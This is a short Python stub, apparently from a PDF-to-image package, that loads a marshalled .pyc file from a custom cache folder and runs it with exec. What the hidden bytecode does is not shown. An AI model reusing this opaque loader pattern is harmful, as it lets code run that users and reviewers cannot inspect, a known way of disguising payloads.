
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'PdfToImage_2cdf851601164482bed424d56277200a.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
